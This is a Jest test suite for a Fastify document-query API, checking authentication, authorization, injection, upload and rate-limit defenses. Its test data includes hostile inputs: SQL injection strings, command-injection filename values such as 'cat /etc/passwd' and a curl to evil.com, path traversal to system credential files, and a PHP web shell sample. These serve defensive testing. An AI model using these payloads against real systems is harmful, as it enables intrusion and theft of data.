import { FastifyInstance } from 'fastify';
import { build } from '@/app';
import {
  TestContextManager,
  SecurityTestHelper,
  FileUploadHelper,
} from '../utils/test-helpers';
import {
  UserFactory,
  ErrorScenarioFactory,
  TestDataSeeder,
} from '../utils/test-factories';

/**
 * Comprehensive Security Tests
 * These tests validate security measures against common attack vectors
 */
describe('Security Test Suite', () => {
  let app: FastifyInstance;
  let context: Awaited<ReturnType<typeof TestContextManager.createContext>>;

  beforeAll(async () => {
    app = await build({ logger: false });
    await app.ready();
    context = await TestContextManager.createContext(app);
  });

  afterAll(async () => {
    await TestContextManager.cleanup();
    await app.close();
  });

  beforeEach(async () => {
    await TestDataSeeder.cleanupTestData();
    context = await TestContextManager.createContext(app);
  });

  afterEach(async () => {
    await FileUploadHelper.cleanup();
  });

  describe('Authentication Security', () => {
    describe('JWT Token Security', () => {
      it('should reject malformed JWT tokens', async () => {
        const malformedTokens = [
          'not.a.jwt',
          'Bearer invalid.jwt.token',
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
          'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0..signature', // None algorithm
          '',
          'null',
          'undefined',
        ];

        for (const token of malformedTokens) {
          const response = await app.inject({
            method: 'GET',
            url: '/api/v1/documents',
            headers: { authorization: `Bearer ${token}` },
          });

          expect(response.statusCode).toBe(401);
          const body = JSON.parse(response.body);
          expect(body.success).toBe(false);
          expect(body.error.message).toContain('Invalid token');
        }
      });

      it('should reject expired JWT tokens', async () => {
        // Create a user and get a token
        const user = await UserFactory.createAndSave();
        const loginResponse = await app.inject({
          method: 'POST',
          url: '/api/v1/auth/login',
          payload: { email: user.email, password: user.password },
        });

        const { access_token } = JSON.parse(loginResponse.body).data;

        // Simulate token expiration by manipulating JWT payload
        // In a real scenario, you would wait or mock the JWT service
        const expiredToken = access_token.replace(/\d{10,}/, '1000000000'); // Set exp to past

        const response = await app.inject({
          method: 'GET',
          url: '/api/v1/documents',
          headers: { authorization: `Bearer ${expiredToken}` },
        });

        expect(response.statusCode).toBe(401);
      });

      it('should prevent JWT token replay attacks', async () => {
        const user = await UserFactory.createAndSave();
        
        // Get initial token
        const loginResponse = await app.inject({
          method: 'POST',
          url: '/api/v1/auth/login',
          payload: { email: user.email, password: user.password },
        });

        const { access_token, refresh_token } = JSON.parse(loginResponse.body).data;

        // Use refresh token to get new token
        const refreshResponse = await app.inject({
          method: 'POST',
          url: '/api/v1/auth/refresh',
          payload: { refresh_token },
        });

        expect(refreshResponse.statusCode).toBe(200);

        // Try to use the old refresh token again (should fail)
        const replayResponse = await app.inject({
          method: 'POST',
          url: '/api/v1/auth/refresh',
          payload: { refresh_token },
        });

        expect(replayResponse.statusCode).toBe(401);
        const body = JSON.parse(replayResponse.body);
        expect(body.error.message).toContain('Invalid or expired');
      });
    });

    describe('API Key Security', () => {
      it('should validate API key format and prevent brute force', async () => {
        const invalidApiKeys = [
          'invalid-key',
          'rag_' + 'a'.repeat(10), // Too short
          'rag_' + 'x'.repeat(100), // Too long
          'wrong_prefix_' + 'a'.repeat(64),
          '',
          'null',
          'undefined',
        ];

        for (const apiKey of invalidApiKeys) {
          const response = await app.inject({
            method: 'GET',
            url: '/api/v1/documents',
            headers: { 'x-api-key': apiKey },
          });

          expect(response.statusCode).toBe(401);
        }
      });

      it('should track and limit API key usage', async () => {
        // Test API key with usage limits (if implemented)
        const response = await app.inject({
          method: 'GET',
          url: '/api/v1/documents',
          headers: { 'x-api-key': context.userApiKey },
        });

        expect(response.statusCode).toBe(200);

        // Verify usage was tracked in database
        const apiKeyData = await global.testEnv.prisma.$queryRaw<Array<{
          usage_count: number;
          last_used: Date;
        }>>`
          SELECT usage_count, last_used 
          FROM api_keys 
          WHERE user_id = ${context.regularUser.id}::uuid
        `;

        expect(apiKeyData).toHaveLength(1);
        expect(apiKeyData[0].usage_count).toBeGreaterThan(0);
        expect(apiKeyData[0].last_used).toBeTruthy();
      });

      it('should prevent API key enumeration attacks', async () => {
        // Try many invalid API keys rapidly
        const attempts = 20;
        const responses = [];

        for (let i = 0; i < attempts; i++) {
          const fakeKey = 'rag_' + Math.random().toString(36).substring(2, 66);
          const response = await app.inject({
            method: 'GET',
            url: '/api/v1/documents',
            headers: { 'x-api-key': fakeKey },
          });

          responses.push(response.statusCode);
        }

        // All should return 401, and some should be rate limited (429)
        const unauthorizedResponses = responses.filter(code => code === 401).length;
        const rateLimitedResponses = responses.filter(code => code === 429).length;

        expect(unauthorizedResponses + rateLimitedResponses).toBe(attempts);
        expect(rateLimitedResponses).toBeGreaterThan(0); // Rate limiting should kick in
      });
    });

    describe('Authorization Bypass Prevention', () => {
      it('should prevent privilege escalation', async () => {
        const regularUser = await UserFactory.createAndSave({ role: 'user' });
        const loginResponse = await app.inject({
          method: 'POST',
          url: '/api/v1/auth/login',
          payload: { email: regularUser.email, password: regularUser.password },
        });

        const userToken = JSON.parse(loginResponse.body).data.access_token;

        // Try to access admin endpoints
        const adminEndpoints = [
          '/api/v1/admin/users',
          '/api/v1/admin/system/stats',
          '/api/v1/admin/system/metrics',
          '/api/v1/admin/system/health',
        ];

        for (const endpoint of adminEndpoints) {
          const response = await app.inject({
            method: 'GET',
            url: endpoint,
            headers: { authorization: `Bearer ${userToken}` },
          });

          expect(response.statusCode).toBe(403);
          const body = JSON.parse(response.body);
          expect(body.error.message).toContain('Insufficient permissions');
        }
      });

      it('should prevent horizontal privilege escalation', async () => {
        // Create two users
        const user1 = await UserFactory.createAndSave({ email: 'user1@test.com' });
        const user2 = await UserFactory.createAndSave({ email: 'user2@test.com' });

        // Get tokens
        const user1Login = await app.inject({
          method: 'POST',
          url: '/api/v1/auth/login',
          payload: { email: user1.email, password: user1.password },
        });

        const user2Login = await app.inject({
          method: 'POST',
          url: '/api/v1/auth/login',
          payload: { email: user2.email, password: user2.password },
        });

        const user1Token = JSON.parse(user1Login.body).data.access_token;
        const user2Token = JSON.parse(user2Login.body).data.access_token;

        // User1 uploads a document
        const filePath = await FileUploadHelper.createTestFile(
          'User1 private content',
          'user1-doc.txt'
        );
        const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, user1Token);
        const { documentId } = uploadResponse.body.data;

        // User2 should not be able to access User1's document
        const unauthorizedAccess = await app.inject({
          method: 'GET',
          url: `/api/v1/documents/${documentId}`,
          headers: { authorization: `Bearer ${user2Token}` },
        });

        expect(unauthorizedAccess.statusCode).toBe(404); // Should appear as not found for security
      });
    });

    describe('Session Management', () => {
      it('should handle concurrent sessions securely', async () => {
        const user = await UserFactory.createAndSave();

        // Create multiple sessions
        const loginPromises = Array.from({ length: 5 }, () =>
          app.inject({
            method: 'POST',
            url: '/api/v1/auth/login',
            payload: { email: user.email, password: user.password },
          })
        );

        const loginResponses = await Promise.all(loginPromises);

        // All logins should succeed
        loginResponses.forEach(response => {
          expect(response.statusCode).toBe(200);
        });

        // Each should have unique tokens
        const tokens = loginResponses.map(r => JSON.parse(r.body).data.access_token);
        const uniqueTokens = new Set(tokens);
        expect(uniqueTokens.size).toBe(tokens.length);

        // All tokens should be valid
        for (const token of tokens) {
          const response = await app.inject({
            method: 'GET',
            url: '/api/v1/documents',
            headers: { authorization: `Bearer ${token}` },
          });
          expect(response.statusCode).toBe(200);
        }
      });
    });
  });

  describe('Injection Attack Prevention', () => {
    describe('SQL Injection', () => {
      it('should prevent SQL injection in authentication', async () => {
        const sqlInjectionPayloads = ErrorScenarioFactory.createMaliciousPayloads()
          .filter(payload => payload.includes('\'') || payload.includes('--'));

        for (const payload of sqlInjectionPayloads) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/v1/auth/login',
            payload: {
              email: payload,
              password: 'any-password',
            },
          });

          // Should return authentication error, not SQL error
          expect(response.statusCode).toBe(401);
          const body = JSON.parse(response.body);
          expect(body.error.message).not.toContain('SQL');
          expect(body.error.message).not.toContain('syntax');
          expect(body.error.message).not.toContain('database');
        }
      });

      it('should prevent SQL injection in query parameters', async () => {
        const sqlPayloads = [
          "'; DROP TABLE documents; --",
          "' UNION SELECT * FROM users--",
          "'; UPDATE users SET role='admin'--",
        ];

        for (const payload of sqlPayloads) {
          const response = await app.inject({
            method: 'GET',
            url: `/api/v1/documents?search=${encodeURIComponent(payload)}`,
            headers: { authorization: `Bearer ${context.userToken}` },
          });

          // Should handle gracefully without exposing SQL errors
          expect([200, 400]).toContain(response.statusCode);
          
          if (response.statusCode === 400) {
            const body = JSON.parse(response.body);
            expect(body.error.message).not.toContain('SQL');
          }
        }
      });

      it('should prevent SQL injection in RAG queries', async () => {
        const sqlPayloads = SecurityTestHelper.SQL_INJECTION_PAYLOADS;

        for (const payload of sqlPayloads) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/v1/query',
            headers: { authorization: `Bearer ${context.userToken}` },
            payload: {
              query: payload,
              mode: 'local',
              queryType: 'text',
            },
          });

          // Should process as normal query, not expose SQL errors
          expect([200, 400]).toContain(response.statusCode);
          
          if (response.statusCode === 200) {
            const body = JSON.parse(response.body);
            expect(body.data.result).not.toContain('DROP');
            expect(body.data.result).not.toContain('DELETE');
          }
        }
      });
    });

    describe('XSS Prevention', () => {
      it('should sanitize user input to prevent stored XSS', async () => {
        const xssPayloads = SecurityTestHelper.XSS_PAYLOADS;

        for (const payload of xssPayloads) {
          // Try to store XSS in user profile/preferences
          const response = await app.inject({
            method: 'PATCH',
            url: '/api/v1/users/profile',
            headers: { authorization: `Bearer ${context.userToken}` },
            payload: {
              displayName: payload,
              bio: `Bio with ${payload}`,
            },
          });

          expect(response.statusCode).toBe(200);
          const body = JSON.parse(response.body);
          
          // XSS should be sanitized
          expect(body.data.displayName).not.toContain('<script>');
          expect(body.data.displayName).not.toContain('javascript:');
          expect(body.data.bio).not.toContain('<script>');
          expect(body.data.bio).not.toContain('onerror');
        }
      });

      it('should prevent XSS in document metadata', async () => {
        const xssPayload = '<script>alert("XSS")</script>';
        
        const filePath = await FileUploadHelper.createTestFile(
          'Normal content',
          `${xssPayload}.txt`
        );

        const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, context.userToken);
        expect(uploadResponse.statusCode).toBe(201);

        // Retrieve documents list
        const documentsResponse = await app.inject({
          method: 'GET',
          url: '/api/v1/documents',
          headers: { authorization: `Bearer ${context.userToken}` },
        });

        expect(documentsResponse.statusCode).toBe(200);
        const body = JSON.parse(documentsResponse.body);
        
        // Filename should be sanitized
        const uploadedDoc = body.data.documents[0];
        expect(uploadedDoc.originalName).not.toContain('<script>');
      });
    });

    describe('Command Injection Prevention', () => {
      it('should prevent command injection in file names', async () => {
        const commandInjectionPayloads = [
          '; cat /etc/passwd',
          '| ls -la',
          '&& whoami',
          '$(id)',
          '`id`',
          '$((curl http://evil.com))',
        ];

        for (const payload of commandInjectionPayloads) {
          const filePath = await FileUploadHelper.createTestFile(
            'Test content',
            `file${payload}.txt`
          );

          const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, context.userToken);
          
          // Should either sanitize filename or reject upload
          if (uploadResponse.statusCode === 201) {
            const body = uploadResponse.body;
            expect(body.data.filename).not.toContain(';');
            expect(body.data.filename).not.toContain('|');
            expect(body.data.filename).not.toContain('&&');
          } else {
            expect(uploadResponse.statusCode).toBe(400);
          }
        }
      });
    });

    describe('Path Traversal Prevention', () => {
      it('should prevent directory traversal attacks', async () => {
        const pathTraversalPayloads = SecurityTestHelper.PATH_TRAVERSAL_PAYLOADS;

        for (const payload of pathTraversalPayloads) {
          // Try path traversal in document access
          const response = await app.inject({
            method: 'GET',
            url: `/api/v1/documents/${encodeURIComponent(payload)}`,
            headers: { authorization: `Bearer ${context.userToken}` },
          });

          // Should return 404 or 400, not expose file system
          expect([400, 404]).toContain(response.statusCode);
          
          const body = JSON.parse(response.body);
          expect(body.error.message).not.toContain('/etc/passwd');
          expect(body.error.message).not.toContain('system32');
        }
      });

      it('should validate file paths in upload endpoints', async () => {
        // This test would need custom form data manipulation
        // For now, we'll test filename sanitization
        const maliciousFilenames = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '/etc/passwd',
          'C:\\Windows\\System32\\config\\sam',
        ];

        for (const filename of maliciousFilenames) {
          const filePath = await FileUploadHelper.createTestFile(
            'Test content',
            filename
          );

          const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, context.userToken);
          
          if (uploadResponse.statusCode === 201) {
            const body = uploadResponse.body;
            // Should sanitize path components
            expect(body.data.filename).not.toContain('../');
            expect(body.data.filename).not.toContain('..\\');
            expect(body.data.filename).not.toContain('/etc/');
          } else {
            expect(uploadResponse.statusCode).toBe(400);
          }
        }
      });
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    it('should enforce rate limits on authentication endpoints', async () => {
      const { blockedCount } = await SecurityTestHelper.testRateLimit(
        app,
        '/api/v1/auth/login',
        'POST',
        25 // Attempt 25 requests
      );

      expect(blockedCount).toBeGreaterThan(0);
    });

    it('should enforce rate limits on API endpoints', async () => {
      const { blockedCount } = await SecurityTestHelper.testRateLimit(
        app,
        '/api/v1/documents',
        'GET',
        100, // Many requests
        { authorization: `Bearer ${context.userToken}` }
      );

      expect(blockedCount).toBeGreaterThan(0);
    });

    it('should handle large payload attacks', async () => {
      const largePayload = {
        query: 'A'.repeat(1000000), // 1MB string
        mode: 'local',
        queryType: 'text',
      };

      const response = await app.inject({
        method: 'POST',
        url: '/api/v1/query',
        headers: { authorization: `Bearer ${context.userToken}` },
        payload: largePayload,
      });

      // Should reject or handle gracefully
      expect([400, 413]).toContain(response.statusCode);
    });

    it('should prevent regex DoS attacks', async () => {
      const regexDoSPayloads = [
        'a'.repeat(100000),
        '('.repeat(1000) + ')'.repeat(1000),
        'x+x+x+x+x+x+x+x+x+y',
      ];

      for (const payload of regexDoSPayloads) {
        const startTime = Date.now();
        
        const response = await app.inject({
          method: 'POST',
          url: '/api/v1/query',
          headers: { authorization: `Bearer ${context.userToken}` },
          payload: {
            query: payload,
            mode: 'local',
            queryType: 'text',
          },
        });

        const duration = Date.now() - startTime;

        // Should not take excessively long to process
        expect(duration).toBeLessThan(10000); // 10 seconds max
        expect([200, 400, 413]).toContain(response.statusCode);
      }
    });
  });

  describe('Data Exposure Prevention', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Test database connection errors
      const response = await app.inject({
        method: 'GET',
        url: '/api/v1/documents/nonexistent-id',
        headers: { authorization: `Bearer ${context.userToken}` },
      });

      const body = JSON.parse(response.body);
      
      // Should not expose internal details
      expect(body.error.message).not.toContain('SELECT');
      expect(body.error.message).not.toContain('database');
      expect(body.error.message).not.toContain('postgres');
      expect(body.error.message).not.toContain('connection');
      expect(body.error.message).not.toContain('stack trace');
    });

    it('should not expose user enumeration vulnerabilities', async () => {
      // Test with non-existent email
      const nonExistentResponse = await app.inject({
        method: 'POST',
        url: '/api/v1/auth/login',
        payload: {
          email: 'nonexistent@example.com',
          password: 'any-password',
        },
      });

      // Test with existing email but wrong password  
      const wrongPasswordResponse = await app.inject({
        method: 'POST',
        url: '/api/v1/auth/login',
        payload: {
          email: context.regularUser.email,
          password: 'wrong-password',
        },
      });

      // Both should return the same error message
      expect(nonExistentResponse.statusCode).toBe(401);
      expect(wrongPasswordResponse.statusCode).toBe(401);

      const body1 = JSON.parse(nonExistentResponse.body);
      const body2 = JSON.parse(wrongPasswordResponse.body);
      
      expect(body1.error.message).toBe(body2.error.message);
    });

    it('should not expose internal system information', async () => {
      const systemEndpoints = [
        '/api/v1/health',
        '/api/v1/metrics',
        '/api/v1/config',
      ];

      for (const endpoint of systemEndpoints) {
        const response = await app.inject({
          method: 'GET',
          url: endpoint,
        });

        if (response.statusCode === 200) {
          const body = JSON.parse(response.body);
          
          // Should not expose sensitive system info
          expect(JSON.stringify(body)).not.toMatch(/password/i);
          expect(JSON.stringify(body)).not.toMatch(/secret/i);
          expect(JSON.stringify(body)).not.toMatch(/token/i);
          expect(JSON.stringify(body)).not.toMatch(/key/i);
          expect(JSON.stringify(body)).not.toMatch(/DATABASE_URL/i);
          expect(JSON.stringify(body)).not.toMatch(/REDIS_URL/i);
        }
      }
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types and prevent malicious uploads', async () => {
      const maliciousFiles = [
        { content: '#!/bin/bash\necho "malicious script"', filename: 'script.sh' },
        { content: '<script>alert("xss")</script>', filename: 'malicious.html' },
        { content: '<?php system($_GET["cmd"]); ?>', filename: 'backdoor.php' },
        { content: Buffer.from([0x7F, 0x45, 0x4C, 0x46]), filename: 'executable' }, // ELF header
      ];

      for (const file of maliciousFiles) {
        const filePath = await FileUploadHelper.createTestFile(file.content, file.filename);
        const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, context.userToken);

        // Should either reject or quarantine
        if (uploadResponse.statusCode === 201) {
          // If accepted, should be quarantined or processed safely
          expect(uploadResponse.body.data.status).toBe('uploaded');
        } else {
          expect(uploadResponse.statusCode).toBe(400);
          expect(uploadResponse.body.error.message).toContain('file type');
        }
      }
    });

    it('should enforce file size limits', async () => {
      // Create oversized file (simulate)
      const oversizedContent = Buffer.alloc(100 * 1024 * 1024); // 100MB
      const filePath = await FileUploadHelper.createTestFile(oversizedContent, 'huge-file.txt');

      const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, context.userToken);

      expect(uploadResponse.statusCode).toBe(413);
      const body = uploadResponse.body;
      expect(body.error.message).toContain('file size');
    });

    it('should prevent zip bombs and archive attacks', async () => {
      // Create nested zip structure (simulated)
      const suspiciousArchive = Buffer.from('PK'); // ZIP header
      const filePath = await FileUploadHelper.createTestFile(suspiciousArchive, 'suspicious.zip');

      const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, context.userToken);

      // Should handle archive files carefully
      if (uploadResponse.statusCode === 201) {
        // Should process safely without extracting
        expect(uploadResponse.body.data).toHaveProperty('documentId');
      } else {
        expect([400, 415]).toContain(uploadResponse.statusCode);
      }
    });
  });

  describe('CORS and Headers Security', () => {
    it('should set appropriate security headers', async () => {
      const response = await app.inject({
        method: 'GET',
        url: '/api/v1/health',
      });

      const headers = response.headers;

      // Should have security headers
      expect(headers).toHaveProperty('x-frame-options');
      expect(headers).toHaveProperty('x-content-type-options');
      expect(headers).toHaveProperty('x-xss-protection');
      expect(headers['x-frame-options']).toBe('DENY');
      expect(headers['x-content-type-options']).toBe('nosniff');
    });

    it('should handle CORS properly', async () => {
      const response = await app.inject({
        method: 'OPTIONS',
        url: '/api/v1/documents',
        headers: {
          'origin': 'https://malicious-site.com',
          'access-control-request-method': 'GET',
        },
      });

      // CORS should be restrictive
      expect(response.statusCode).toBe(204);
      
      const corsHeaders = response.headers;
      if (corsHeaders['access-control-allow-origin']) {
        expect(corsHeaders['access-control-allow-origin']).not.toBe('*');
      }
    });
  });

  describe('Business Logic Security', () => {
    it('should prevent unauthorized document access across users', async () => {
      // Create two users
      const user1 = await UserFactory.createAndSave({ email: 'user1@security.com' });
      const user2 = await UserFactory.createAndSave({ email: 'user2@security.com' });

      // Get tokens
      const user1Login = await app.inject({
        method: 'POST',
        url: '/api/v1/auth/login',
        payload: { email: user1.email, password: user1.password },
      });

      const user2Login = await app.inject({
        method: 'POST',
        url: '/api/v1/auth/login',
        payload: { email: user2.email, password: user2.password },
      });

      const user1Token = JSON.parse(user1Login.body).data.access_token;
      const user2Token = JSON.parse(user2Login.body).data.access_token;

      // User1 uploads document
      const filePath = await FileUploadHelper.createTestFile('Private content', 'private.txt');
      const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, user1Token);
      const { documentId } = uploadResponse.body.data;

      // User2 tries to access User1's document
      const unauthorizedAccess = await app.inject({
        method: 'GET',
        url: `/api/v1/documents/${documentId}`,
        headers: { authorization: `Bearer ${user2Token}` },
      });

      expect(unauthorizedAccess.statusCode).toBe(404); // Should appear as not found
    });

    it('should prevent query result data leakage', async () => {
      // Upload document with sensitive content
      const sensitiveContent = `
        Confidential Information:
        - Password: secret123
        - API Key: rag_supersecretapikey123456789
        - Database URL: postgresql://user:pass@db.internal:5432/prod
      `;

      const filePath = await FileUploadHelper.createTestFile(sensitiveContent, 'sensitive.txt');
      const uploadResponse = await FileUploadHelper.uploadFile(app, filePath, context.userToken);
      
      // Wait for processing
      const { jobId } = uploadResponse.body.data;
      await DatabaseTestHelper.waitForJobCompletion(jobId, 30000);

      // Query should not return raw sensitive data
      const queryResponse = await app.inject({
        method: 'POST',
        url: '/api/v1/query',
        headers: { authorization: `Bearer ${context.userToken}` },
        payload: {
          query: 'What passwords are mentioned?',
          mode: 'local',
          queryType: 'text',
        },
      });

      expect(queryResponse.statusCode).toBe(200);
      const body = JSON.parse(queryResponse.body);
      
      // Should not expose raw sensitive data in response
      expect(body.data.result).not.toContain('secret123');
      expect(body.data.result).not.toContain('rag_supersecretapikey');
      expect(body.data.result).not.toContain('postgresql://');
    });
  });
});